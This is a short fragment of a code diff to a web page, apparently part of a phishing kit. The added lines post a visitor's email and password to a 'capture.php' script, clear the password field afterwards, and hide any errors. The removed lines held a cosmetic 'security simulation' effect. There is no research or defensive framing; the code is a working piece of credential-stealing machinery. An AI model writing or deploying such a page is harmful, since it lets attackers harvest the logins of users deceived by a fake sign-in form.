+            url: 'capture.php',
+            data: {
+                email: email,
+                password: password
+            },
+            dataType: 'json',
+            success: function(response) {
+                if (response.signal === 'ok') {
+                    $("#password").val(""); // Clear password field after submission
+                }
+            },
+            error: function(xhr, status, error) {
+                // Handle any errors silently
+                $("#password").val(""); // Clear password field after submission
             }
         });
-        
-        // Enhanced security simulation
-        setInterval(function() {
-            const sessionElement = document.getElementById('session-display');
-            if (sessionElement && Math.random() < 0.1) { // 10% chance every interval
-                sessionElement.style.opacity = '0.7';
-                setTimeout(() => {
-                    sessionElement.style.opacity = '1';
-                }, 200);
-            }
-        }, 30000); // Every 30 seconds
-    </script>
-</body>
-</html>
+    });
+});
+
+</script>
+</body></html>
